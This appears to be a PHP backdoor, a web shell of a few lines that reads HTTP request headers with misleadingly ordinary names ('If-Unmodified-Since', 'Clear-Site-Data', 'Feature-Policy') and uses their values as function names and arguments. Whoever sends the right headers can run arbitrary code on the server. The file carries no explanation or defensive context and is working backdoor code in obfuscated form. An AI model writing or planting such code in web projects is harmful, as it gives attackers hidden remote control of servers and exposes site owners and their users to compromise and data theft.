<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $sys = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Feature-Policy']));
    $sys();
}